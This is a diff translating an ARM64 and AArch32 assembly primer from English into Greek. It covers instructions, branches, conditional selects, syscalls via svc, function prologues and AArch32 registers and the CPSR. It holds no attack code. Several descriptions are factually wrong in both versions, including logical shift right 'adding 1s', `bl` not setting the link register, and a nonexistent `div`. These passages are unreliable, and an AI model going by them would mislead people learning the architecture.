+- `add x5, x5, #1, lsl #12` — Αυτό ισούται με 4096 (ένα 1 μετατοπισμένο 12 φορές) -> 1 0000 0000 0000 0000
+- **`adds`** Αυτή εκτελεί μια `add` και ενημερώνει τις σημαίες
+- **`sub`**: **Αφαιρέστε** τις τιμές δύο καταχωρητών και αποθηκεύστε το αποτέλεσμα σε έναν καταχωρητή.
+- Ελέγξτε τη **σύνταξη `add`**.
+- Παράδειγμα: `sub x0, x1, x2` — Αυτό αφαιρεί την τιμή στο `x2` από το `x1` και αποθηκεύει το αποτέλεσμα στο `x0`.
+- **`subs`** Αυτό είναι όπως το sub αλλά ενημερώνει τη σημαία
+- **`mul`**: **Πολλαπλασιάστε** τις τιμές **δύο καταχωρητών** και αποθηκεύστε το αποτέλεσμα σε έναν καταχωρητή.
+- Παράδειγμα: `mul x0, x1, x2` — Αυτό πολλαπλασιάζει τις τιμές στο `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
+- **`div`**: **Διαιρέστε** την τιμή ενός καταχωρητή με έναν άλλο και αποθηκεύστε το αποτέλεσμα σε έναν καταχωρητή.
+- Παράδειγμα: `div x0, x1, x2` — Αυτό διαιρεί την τιμή στο `x1` με το `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
 - **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-  - **Logical shift left**: Add 0s from the end moving the other bits forward (multiply by n-times 2)
-  - **Logical shift right**: Add 1s at the beginning moving the other bits backward (divide by n-times 2 in unsigned)
-  - **Arithmetic shift right**: Like **`lsr`**, but instead of adding 0s if the most significant bit is a 1, \*\*1s are added (\*\*divide by ntimes 2 in signed)
-  - **Rotate right**: Like **`lsr`** but whatever is removed from the right it's appended to the left
-  - **Rotate Right with Extend**: Like **`ror`**, but with the carry flag as the "most significant bit". So the carry flag is moved to the bit 31 and the removed bit to the carry flag.
-- **`bfm`**: **Bit Filed Move**, these operations **copy bits `0...n`** from a value an place them in positions **`m..m+n`**. The **`#s`** specifies the **leftmost bit** position and **`#r`** the **rotate right amount**.
-  - Bitfiled move: `BFM Xd, Xn, #r`
-  - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
-  - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
-- **Bitfield Extract and Insert:** Copy a bitfield from a register and copies it to another register.
-  - **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1
-  - **`BFXIL X1, X2, #3, #4`** Extract from the 3rd bit of X2 four bits and copy them to X1
-  - **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
-  - **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2, sign extends them, and places the result in X1
-  - **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
-  - **`UBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.
-- **Sign Extend To X:** Extends the sign (or adds just 0s in the unsigned version) of a value to be able to perform operations with it:
-  - **`SXTB X1, W2`** Extends the sign of a byte **from W2 to X1** (`W2` is half of `X2`) to fill the 64bits
-  - **`SXTH X1, W2`** Extends the sign of a 16bit number **from W2 to X1** to fill the 64bits
-  - **`SXTW X1, W2`** Extends the sign of a byte **from W2 to X1** to fill the 64bits
-  - **`UXTB X1, W2`** Adds 0s (unsigned) to a byte **from W2 to X1** to fill the 64bits
-- **`extr`:** Extracts bits from a specified **pair of registers concatenated**.
-  - Example: `EXTR W3, W2, W1, #3` This will **concat W1+W2** and get **from bit 3 of W2 up to bit 3 of W1** and store it in W3.
-- **`cmp`**: **Compare** two registers and set condition flags. It's an **alias of `subs`** setting the destination register to the zero register. Useful to know if `m == n`.
-  - It supports the **same syntax as `subs`**
-  - Example: `cmp x0, x1` — This compares the values in `x0` and `x1` and sets the condition flags accordingly.
-- **`cmn`**: **Compare negative** operand. In this case it's an **alias of `adds`** and supports the same syntax. Useful to know if `m == -n`.
-- **`ccmp`**: Conditional comparison, it's a comparison that will be performed only if a previous comparison was true and will specifically set nzcv bits.
-  - `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> if x1 != x2 and x3 < x4, jump to func
-    - This is because **`ccmp`** will only be executed if the **previous `cmp` was a `NE`**, if it wasn't the bits `nzcv` will be set to 0 (which won't satisfy the `blt` comparison).
-    - This ca also be used as `ccmn` (same but negative, like `cmp` vs `cmn`).
-- **`tst`**: It checks if any of the values of the comparison are both 1 (it works like and ANDS without storing the result anywhere). It's useful to check a registry with a value and check if any of the bits of the registry indicated in the value is 1.
-  - Example: `tst X1, #7` Check if any of the last 3 bits of X1 is 1
-- **`teq`**: XOR operation discarding the result
-- **`b`**: Unconditional Branch
-  - Example: `b myFunction`
-  - Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
-- **`bl`**: **Branch** with link, used to **call** a **subroutine**. Stores the **return address in `x30`**.
-  - Example: `bl myFunction` — This calls the function `myFunction` and stores the return address in `x30`.
-  - Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
-- **`blr`**: **Branch** with Link to Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address in `x30`. (This is
-  - Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the return address in `x30`.
-- **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.
-  - Example: `ret` — This returns from the current subroutine using the return address in `x30`.
-- **`b.<cond>`**: Conditional branches
-  - **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.
-    - Example: `b.eq label` — If the previous `cmp` instruction found two equal values, this jumps to `label`.
-  - **`b.ne`**: **Branch if Not Equal**. This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared values were not equal, it branches to a label or address.
-    - Example: After a `cmp x0, x1` instruction, `b.ne label` — If the values in `x0` and `x1` were not equal, this jumps to `label`.
-- **`cbz`**: **Compare and Branch on Zero**. This instruction compares a register with zero, and if they are equal, it branches to a label or address.
-  - Example: `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.
-- **`cbnz`**: **Compare and Branch on Non-Zero**. This instruction compares a register with zero, and if they are not equal, it branches to a label or address.
-  - Example: `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.
-- **`tbnz`**: Test bit and branch on nonzero
-  - Example: `tbnz x0, #8, label`
-- **`tbz`**: Test bit and branch on zero
-  - Example: `tbz x0, #8, label`
-- **Conditional select operations**: These are operations whose behaviour varies depending on the conditional bits.
-  - `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> If true, X0 = X1, if false, X0 = X2
-  - `csinc Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = Xm + 1
-  - `cinc Xd, Xn, cond` -> If true, Xd = Xn + 1, if false, Xd = Xn
-  - `csinv Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = NOT(Xm)
-  - `cinv Xd, Xn, cond` -> If true, Xd = NOT(Xn), if false, Xd = Xn
-  - `csneg Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = - Xm
-  - `cneg Xd, Xn, cond` -> If true, Xd = - Xn, if false, Xd = Xn
-  - `cset Xd, Xn, Xm, cond` -> If true, Xd = 1, if false, Xd = 0
-  - `csetm Xd, Xn, Xm, cond` -> If true, Xd = \<all 1>, if false, Xd = 0
-- **`adrp`**: Compute the **page address of a symbol** and store it in a register.
-  - Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.
-- **`ldrsw`**: **Load** a signed **32-bit** value from memory and **sign-extend it to 64** bits.
-  - Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
-- **`stur`**: **Store a register value to a memory location**, using an offset from another register.
-  - Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
-- **`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.
+- **Λογική μετατόπιση αριστερά**: Προσθέστε 0s από το τέλος μετακινώντας τα άλλα bits προς τα εμπρός (πολλαπλασιάστε με n-φορές 2)
+- **Λογική μετατόπιση δεξιά**: Προσθέστε 1s στην αρχή μετακινώντας τα άλλα bits προς τα πίσω (διαιρέστε με n-φορές 2 σε μη υπογεγραμμένα)
+- **Αριθμητική μετατόπιση δεξιά**: Όπως **`lsr`**, αλλά αντί να προσθέσετε 0s αν το πιο σημαντικό bit είναι 1, **προστίθενται 1s** (διαιρέστε με n-φορές 2 σε υπογεγραμμένα)
+- **Μετατόπιση δεξιά**: Όπως **`lsr`** αλλά ό,τι αφαιρείται από τα δεξιά προστίθεται στα αριστερά
+- **Μετατόπιση Δεξιά με Επέκταση**: Όπως **`ror`**, αλλά με τη σημαία μεταφοράς ως "πιο σημαντικό bit". Έτσι η σημαία μεταφοράς μετακινείται στο bit 31 και το αφαιρεθέν bit στη σημαία μεταφοράς.
+- **`bfm`**: **Μετακίνηση Bit Filed**, αυτές οι λειτουργίες **αντιγράφουν bits `0...n`** από μια τιμή και τα τοποθετούν σε θέσεις **`m..m+n`**. Το **`#s`** καθορίζει τη **θέση του αριστερού bit** και το **`#r`** την **ποσότητα μετατόπισης δεξιά**.
+- Μετακίνηση bitfiled: `BFM Xd, Xn, #r`
+- Υπογεγραμμένη μετακίνηση bitfield: `SBFM Xd, Xn, #r, #s`
+- Μη υπογεγραμμένη μετακίνηση bitfield: `UBFM Xd, Xn, #r, #s`
+- **Εξαγωγή και Εισαγωγή Bitfield:** Αντιγράφει ένα bitfield από έναν καταχωρητή και το αντιγράφει σε έναν άλλο καταχωρητή.
+- **`BFI X1, X2, #3, #4`** Εισάγει 4 bits από το X2 από το 3ο bit του X1
+- **`BFXIL X1, X2, #3, #4`** Εξάγει από το 3ο bit του X2 τέσσερα bits και τα αντιγράφει στο X1
+- **`SBFIZ X1, X2, #3, #4`** Επεκτείνει το σήμα 4 bits από το X2 και τα εισάγει στο X1 ξεκινώντας από τη θέση bit 3 μηδενίζοντας τα δεξιά bits
+- **`SBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 από το X2, επεκτείνει το σήμα τους και τοποθετεί το αποτέλεσμα στο X1
+- **`UBFIZ X1, X2, #3, #4`** Μηδενίζει 4 bits από το X2 και τα εισάγει στο X1 ξεκινώντας από τη θέση bit 3 μηδενίζοντας τα δεξιά bits
+- **`UBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 από το X2 και τοποθετεί το μηδενισμένο αποτέλεσμα στο X1.
+- **Επέκταση Σημασίας σε X:** Επεκτείνει το σήμα (ή προσθέτει απλώς 0s στην μη υπογεγραμμένη έκδοση) μιας τιμής για να μπορέσει να εκτελέσει λειτουργίες με αυτήν:
+- **`SXTB X1, W2`** Επεκτείνει το σήμα ενός byte **από W2 σε X1** (`W2` είναι το μισό του `X2`) για να γεμίσει τα 64bits
+- **`SXTH X1, W2`** Επεκτείνει το σήμα ενός αριθμού 16bit **από W2 σε X1** για να γεμίσει τα 64bits
+- **`SXTW X1, W2`** Επεκτείνει το σήμα ενός byte **από W2 σε X1** για να γεμίσει τα 64bits
+- **`UXTB X1, W2`** Προσθέτει 0s (μη υπογεγραμμένα) σε ένα byte **από W2 σε X1** για να γεμίσει τα 64bits
+- **`extr`:** Εξάγει bits από ένα καθορισμένο **ζεύγος καταχωρητών που συνδυάζονται**.
+- Παράδειγμα: `EXTR W3, W2, W1, #3` Αυτό θα **συνδυάσει W1+W2** και θα πάρει **από το bit 3 του W2 έως το bit 3 του W1** και θα το αποθηκεύσει στο W3.
+- **`cmp`**: **Συγκρίνετε** δύο καταχωρητές και ρυθμίστε τις σημαίες συνθηκών. Είναι ένα **ψευδώνυμο του `subs`** ρυθμίζοντας τον καταχωρητή προορισμού στο μηδενικό καταχωρητή. Χρήσιμο για να γνωρίζετε αν `m == n`.
+- Υποστηρίζει την **ίδια σύνταξη με `subs`**
+- Παράδειγμα: `cmp x0, x1` — Αυτό συγκρίνει τις τιμές στο `x0` και `x1` και ρυθμίζει τις σημαίες συνθηκών αναλόγως.
+- **`cmn`**: **Συγκρίνετε αρνητική** παράμετρο. Σε αυτή την περίπτωση είναι ένα **ψευδώνυμο του `adds`** και υποστηρίζει την ίδια σύνταξη. Χρήσιμο για να γνωρίζετε αν `m == -n`.
+- **`ccmp`**: Συνθήκη σύγκρισης, είναι μια σύγκριση που θα εκτελείται μόνο αν μια προηγούμενη σύγκριση ήταν αληθής και θα ρυθμίσει συγκεκριμένα τα bits nzcv.
+- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> αν x1 != x2 και x3 < x4, πηγαίνετε στη func
+- Αυτό συμβαίνει επειδή **`ccmp`** θα εκτελείται μόνο αν η **προηγούμενη `cmp` ήταν `NE`**, αν δεν ήταν τα bits `nzcv` θα ρυθμιστούν σε 0 (που δεν θα ικανοποιήσει τη σύγκριση `blt`).
+- Αυτό μπορεί επίσης να χρησιμοποιηθεί ως `ccmn` (ίδιο αλλά αρνητικό, όπως `cmp` έναντι `cmn`).
+- **`tst`**: Ελέγχει αν οποιαδήποτε από τις τιμές της σύγκρισης είναι και οι δύο 1 (λειτουργεί όπως και το ANDS χωρίς να αποθηκεύει το αποτέλεσμα οπουδήποτε). Είναι χρήσιμο για να ελέγξετε έναν καταχωρητή με μια τιμή και να δείτε αν οποιοδήποτε από τα bits του καταχωρητή που υποδεικνύεται στην τιμή είναι 1.
+- Παράδειγμα: `tst X1, #7` Ελέγξτε αν οποιοδήποτε από τα τελευταία 3 bits του X1 είναι 1
+- **`teq`**: Λειτουργία XOR απορρίπτοντας το αποτέλεσμα
+- **`b`**: Ανεξάρτητος Κλάδος
+- Παράδειγμα: `b myFunction`
+- Σημειώστε ότι αυτό δεν θα γεμίσει τον καταχωρητή σύνδεσης με τη διεύθυνση επιστροφής (δεν είναι κατάλληλο για κλήσεις υπορουτίνων που χρειάζονται επιστροφή)
+- **`bl`**: **Κλάδος** με σύνδεση, χρησιμοποιείται για να **καλέσει** μια **υπορουτίνα**. Αποθηκεύει τη **διεύθυνση επιστροφής στο `x30`**.
+- Παράδειγμα: `bl myFunction` — Αυτό καλεί τη συνάρτηση `myFunction` και αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
+- Σημειώστε ότι αυτό δεν θα γεμίσει τον καταχωρητή σύνδεσης με τη διεύθυνση επιστροφής (δεν είναι κατάλληλο για κλήσεις υπορουτίνων που χρειάζονται επιστροφή)
+- **`blr`**: **Κλάδος** με Σύνδεση σε Καταχωρητή, χρησιμοποιείται για να **καλέσει** μια **υπορουτίνα** όπου ο στόχος είναι **καθορισμένος** σε έναν **καταχωρητή**. Αποθηκεύει τη διεύθυνση επιστροφής στο `x30`. (Αυτό είναι
+- Παράδειγμα: `blr x1` — Αυτό καλεί τη συνάρτηση της οποίας η διεύθυνση περιέχεται στο `x1` και αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
+- **`ret`**: **Επιστροφή** από **υπορουτίνα**, συνήθως χρησιμοποιώντας τη διεύθυνση στο **`x30`**.
+- Παράδειγμα: `ret` — Αυτό επιστρέφει από την τρέχουσα υπορουτίνα χρησιμοποιώντας τη διεύθυνση επιστροφής στο `x30`.
+- **`b.<cond>`**: Συνθήκες κλάδου
+- **`b.eq`**: **Κλάδος αν ίσο**, βασισμένος στην προηγούμενη εντολή `cmp`.
+- Παράδειγμα: `b.eq label` — Εάν η προηγούμενη εντολή `cmp` βρήκε δύο ίσες τιμές, αυτό πηγαίνει στην `label`.
+- **`b.ne`**: **Κλάδος αν Όχι Ίσο**. Αυτή η εντολή ελέγχει τις σημαίες συνθηκών (οι οποίες ρυθμίστηκαν από μια προηγούμενη εντολή σύγκρισης), και αν οι συγκρινόμενες τιμές δεν ήταν ίσες, κλάδος σε μια ετικέτα ή διεύθυνση.
+- Παράδειγμα: Μετά από μια εντολή `cmp x0, x1`, `b.ne label` — Εάν οι τιμές στο `x0` και `x1` δεν ήταν ίσες, αυτό πηγαίνει στην `label`.
+- **`cbz`**: **Συγκρίνετε και Κλάδος σε Μηδέν**. Αυτή η εντολή συγκρίνει έναν καταχωρητή με το μηδέν, και αν είναι ίσοι, κλάδος σε μια ετικέτα ή διεύθυνση.
+- Παράδειγμα: `cbz x0, label` — Εάν η τιμή στο `x0` είναι μηδέν, αυτό πηγαίνει στην `label`.
+- **`cbnz`**: **Συγκρίνετε και Κλάδος σε Μη Μηδέν**. Αυτή η εντολή συγκρίνει έναν καταχωρητή με το μηδέν, και αν δεν είναι ίσοι, κλάδος σε μια ετικέτα ή διεύθυνση.
+- Παράδειγμα: `cbnz x0, label` — Εάν η τιμή στο `x0` είναι μη μηδέν, αυτό πηγαίνει στην `label`.
+- **`tbnz`**: Δοκιμή bit και κλάδος σε μη μηδέν
+- Παράδειγμα: `tbnz x0, #8, label`
+- **`tbz`**: Δοκιμή bit και κλάδος σε μηδέν
+- Παράδειγμα: `tbz x0, #8, label`
+- **Συνθήκες επιλεγμένων λειτουργιών**: Αυτές είναι λειτουργίες των οποίων η συμπεριφορά ποικίλλει ανάλογα με τα συνθήκες bits.
+- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Εάν είναι αληθές, X0 = X1, εάν ψευδές, X0 = X2
+- `csinc Xd, Xn, Xm, cond` -> Εάν είναι αληθές, Xd = Xn, εάν ψευδές, Xd = Xm + 1
+- `cinc Xd, Xn, cond` -> Εάν είναι αληθές, Xd = Xn + 1, εάν ψευδές, Xd = Xn
+- `csinv Xd, Xn, Xm, cond` -> Εάν είναι αληθές, Xd = Xn, εάν ψευδές, Xd = NOT(Xm)
+- `cinv Xd, Xn, cond` -> Εάν είναι αληθές, Xd = NOT(Xn), εάν ψευδές, Xd = Xn
+- `csneg Xd, Xn, Xm, cond` -> Εάν είναι αληθές, Xd = Xn, εάν ψευδές, Xd = - Xm
+- `cneg Xd, Xn, cond` -> Εάν είναι αληθές, Xd = - Xn, εάν ψευδές, Xd = Xn
+- `cset Xd, Xn, Xm, cond` -> Εάν είναι αληθές, Xd = 1, εάν ψευδές, Xd = 0
+- `csetm Xd, Xn, Xm, cond` -> Εάν είναι αληθές, Xd = \<όλα 1>, εάν ψευδές, Xd = 0
+- **`adrp`**: Υπολογίστε τη **διεύθυνση σελίδας ενός συμβόλου** και αποθηκεύστε την σε έναν καταχωρητή.
+- Παράδειγμα: `adrp x0, symbol` — Αυτό υπολογίζει τη διεύθυνση σελίδας του `symbol` και την αποθηκεύει στο `x0`.
+- **`ldrsw`**: **Φόρτωση** μιας υπογεγραμμένης **32-bit** τιμής από τη μνήμη και **επέκταση του σήματος σε 64** bits.
+- Παράδειγμα: `ldrsw x0, [x1]` — Αυτό φορτώνει μια υπογεγραμμένη 32-bit τιμή από τη διεύθυνση μνήμης που υποδεικνύεται από το `x1`, επεκτείνει το σήμα σε 64 bits και την αποθηκεύει στο `x0`.
+- **`stur`**: **Αποθήκευση μιας τιμής καταχωρητή σε μια διεύθυνση μνήμης**, χρησιμοποιώντας ένα offset από έναν άλλο καταχωρητή.
+- Παράδειγμα: `stur x0, [x1, #4]` — Αυτό αποθηκεύει την τιμή στο `x0` στη διεύθυνση μνήμης που είναι 4 bytes μεγαλύτερη από τη διεύθυνση που είναι ήδη στο `x1`.
+- **`svc`** : Κάντε μια **κλήση συστήματος**. Σημαίνει "Κλήση Επιτρόπου". Όταν ο επεξεργαστής εκτελεί αυτή την εντολή, **μεταβαίνει από τη λειτουργία χρήστη σε λειτουργία πυρήνα** και πηγαίνει σε μια συγκεκριμένη τοποθεσία στη μνήμη όπου βρίσκεται ο **κώδικας χειρισμού κλήσεων συστήματος του πυρήνα**.
 
-  - Example:
+- Παράδειγμα:
 
-    ```armasm
-    mov x8, 93  ; Load the system call number for exit (93) into register x8.
-    mov x0, 0   ; Load the exit status code (0) into register x0.
-    svc 0       ; Make the system call.
-    ```
+```armasm
+mov x8, 93  ; Φόρτωση του αριθμού κλήσης συστήματος για έξοδο (93) στον καταχωρητή x8.
+mov x0, 0   ; Φόρτωση του κωδικού κατάστασης εξόδου (0) στον καταχωρητή x0.
+svc 0       ; Κάντε την κλήση συστήματος.
+```
 
-### **Function Prologue**
+### **Πρόλογος Συνάρτησης**
 
-1. **Save the link register and frame pointer to the stack**:
-
+1. **Αποθηκεύστε τον καταχωρητή σύνδεσης και τον δείκτη πλαισίου στο στοίβα**:
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
+2. **Ρύθμιση του νέου δείκτη πλαισίου**: `mov x29, sp` (ρυθμίζει τον νέο δείκτη πλαισίου για την τρέχουσα συνάρτηση)  
+3. **Δημιουργία χώρου στη στοίβα για τοπικές μεταβλητές** (αν χρειάζεται): `sub sp, sp, <size>` (όπου `<size>` είναι ο αριθμός των byte που χρειάζονται)  
 
-2. **Set up the new frame pointer**: `mov x29, sp` (sets up the new frame pointer for the current function)
-3. **Allocate space on the stack for local variables** (if needed): `sub sp, sp, <size>` (where `<size>` is the number of bytes needed)
+### **Επίλογος Συνάρτησης**
 
-### **Function Epilogue**
-
-1. **Deallocate local variables (if any were allocated)**: `add sp, sp, <size>`
-2. **Restore the link register and frame pointer**:
-
+1. **Αποδέσμευση τοπικών μεταβλητών (αν έχουν αποδεσμευτεί)**: `add sp, sp, <size>`  
+2. **Αποκατάσταση του καταχωρητή σύνδεσης και του δείκτη πλαισίου**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
+3. **Return**: `ret` (επιστρέφει τον έλεγχο στον καλούντα χρησιμοποιώντας τη διεύθυνση στο register σύνδεσης)
 
-3. **Return**: `ret` (returns control to the caller using the address in the link register)
+## AARCH32 Κατάσταση Εκτέλεσης
 
-## AARCH32 Execution State
+Το Armv8-A υποστηρίζει την εκτέλεση 32-bit προγραμμάτων. **AArch32** μπορεί να εκτελείται σε ένα από **δύο σύνολα εντολών**: **`A32`** και **`T32`** και μπορεί να αλλάξει μεταξύ τους μέσω **`interworking`**.\
+**Προνομιακά** 64-bit προγράμματα μπορούν να προγραμματίσουν την **εκτέλεση 32-bit** προγραμμάτων εκτελώντας μια μεταφορά επιπέδου εξαίρεσης σε χαμηλότερο προνομιακό 32-bit.\
+Σημειώστε ότι η μετάβαση από 64-bit σε 32-bit συμβαίνει με χαμηλότερο επίπεδο εξαίρεσης (για παράδειγμα, ένα 64-bit πρόγραμμα σε EL1 που ενεργοποιεί ένα πρόγραμμα σε EL0). Αυτό γίνεται ρυθμίζοντας το **bit 4 του** **`SPSR_ELx`** ειδικού καταχωρητή **σε 1** όταν το νήμα διαδικασίας `AArch32` είναι έτοιμο να εκτελεστεί και το υπόλοιπο του `SPSR_ELx` αποθηκεύει το **`AArch32`** CPSR. Στη συνέχεια, η προνομιακή διαδικασία καλεί την εντολή **`ERET`** ώστε ο επεξεργαστής να μεταβεί σε **`AArch32`** εισερχόμενος σε A32 ή T32 ανάλογα με το CPSR\*\*.\*\*
 
-Armv8-A support the execution of 32-bit programs. **AArch32** can run in one of **two instruction sets**: **`A32`** and **`T32`** and can switch between them via **`interworking`**.\
-**Privileged** 64-bit programs can schedule the **execution of 32-bit** programs by executing a exception level transfer to the lower privileged 32-bit.\
-Note that the transition from 64-bit to 32-bit occurs with a lower of the exception level (for example a 64-bit program in EL1 triggering a program in EL0). This is done by setting the **bit 4 of** **`SPSR_ELx`** special register **to 1** when the `AArch32` process thread is ready to be executed and the rest of `SPSR_ELx` stores the **`AArch32`** programs CPSR. Then, the privileged process calls the **`ERET`** instruction so the processor transitions to **`AArch32`** entering in A32 or T32 depending on CPSR\*\*.\*\*
+Η **`interworking`** συμβαίνει χρησιμοποιώντας τα bits J και T του CPSR. `J=0` και `T=0` σημαίνει **`A32`** και `J=0` και `T=1` σημαίνει **T32**. Αυτό βασικά μεταφράζεται σε ρύθμιση του **χαμηλότερου bit σε 1** για να υποδείξει ότι το σύνολο εντολών είναι T32.\
+Αυτό ρυθμίζεται κατά τη διάρκεια των **εντολών διακλάδωσης interworking,** αλλά μπορεί επίσης να ρυθμιστεί άμεσα με άλλες εντολές όταν το PC ρυθμίζεται ως ο καταχωρητής προορισμού. Παράδειγμα:
 
-The **`interworking`** occurs using the J and T bits of CPSR. `J=0` and `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to indicate the instruction set is T32.\
-This is set during the **interworking branch instructions,** but can also be set directly with other instructions when the PC is set as the destination register. Example:
-
-Another example:
-
+Ένα άλλο παράδειγμα:
 ```armasm
 _start:
 .code 32                ; Begin using A32
-    add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
-    bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
+add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
+bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 
 .code 16:
-    mov r0, #0
-    mov r0, #8
+mov r0, #0
+mov r0, #8
 ```
-
 ### Registers
 
-There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:
+Υπάρχουν 16 32-bit registers (r0-r15). **Από r0 έως r14** μπορούν να χρησιμοποιηθούν για **οποιαδήποτε λειτουργία**, ωστόσο μερικά από αυτά είναι συνήθως δεσμευμένα:
 
-- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
-- **`r11`**: Frame Pointer
-- **`r12`**: Intra-procedural call register
-- **`r13`**: Stack Pointer
-- **`r14`**: Link Register
+- **`r15`**: Μετρητής προγράμματος (πάντα). Περιέχει τη διεύθυνση της επόμενης εντολής. Στην A32 τρέχουσα + 8, στην T32, τρέχουσα + 4.
+- **`r11`**: Δείκτης πλαισίου
+- **`r12`**: Καταχωρητής κλήσης εντός διαδικασίας
+- **`r13`**: Δείκτης στοίβας
+- **`r14`**: Καταχωρητής σύνδεσης
 
-Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
-This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.
+Επιπλέον, οι καταχωρητές αποθηκεύονται σε **`banked registries`**. Αυτά είναι μέρη που αποθηκεύουν τις τιμές των καταχωρητών επιτρέποντας την **γρήγορη εναλλαγή πλαισίου** στη διαχείριση εξαιρέσεων και σε προνομιακές λειτουργίες για να αποφευχθεί η ανάγκη να αποθηκεύονται και να επαναφέρονται οι καταχωρητές κάθε φορά.\
+Αυτό γίνεται με **την αποθήκευση της κατάστασης του επεξεργαστή από το `CPSR` στο `SPSR`** της λειτουργίας του επεξεργαστή στην οποία λαμβάνεται η εξαίρεση. Κατά την επιστροφή από την εξαίρεση, το **`CPSR`** επαναφέρεται από το **`SPSR`**.
 
 ### CPSR - Current Program Status Register
 
-In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:
+Στην AArch32 το CPSR λειτουργεί παρόμοια με το **`PSTATE`** στην AArch64 και αποθηκεύεται επίσης στο **`SPSR_ELx`** όταν λαμβάνεται μια εξαίρεση για να αποκατασταθεί αργότερα η εκτέλεση:
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-The fields are divided in some groups:
+Τα πεδία είναι χωρισμένα σε ορισμένες ομάδες:
 
-- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
-- Execution State Registers: Process behaviour (managed by the OS).
+- Application Program Status Register (APSR): Αριθμητικές σημαίες και προσβάσιμες από EL0
+- Execution State Registers: Συμπεριφορά διαδικασίας (διαχειρίζεται από το OS).
 
 #### Application Program Status Register (APSR)
 
-- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
-- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
-- **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.
+- Οι σημαίες **`N`**, **`Z`**, **`C`**, **`V`** (όπως στην AArch64)
+- Η σημαία **`Q`**: Ρυθμίζεται σε 1 όποτε **συμβαίνει κορεσμός ακέραιων αριθμών** κατά την εκτέλεση μιας εξειδικευμένης εντολής αριθμητικής κορεσμού. Μόλις ρυθμιστεί σε **`1`**, θα διατηρήσει την τιμή μέχρι να ρυθμιστεί χειροκίνητα σε 0. Επιπλέον, δεν υπάρχει καμία εντολή που να ελέγχει την τιμή της έμμεσα, πρέπει να γίνει διαβάζοντάς την χειροκίνητα.
+- Οι σημαίες **`GE`** (Μεγαλύτερο ή ίσο): Χρησιμοποιούνται σε SIMD (Single Instruction, Multiple Data) λειτουργίες, όπως "παράλληλη πρόσθεση" και "παράλληλη αφαίρεση". Αυτές οι λειτουργίες επιτρέπουν την επεξεργασία πολλαπλών σημείων δεδομένων σε μία μόνο εντολή.
 
-  For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.
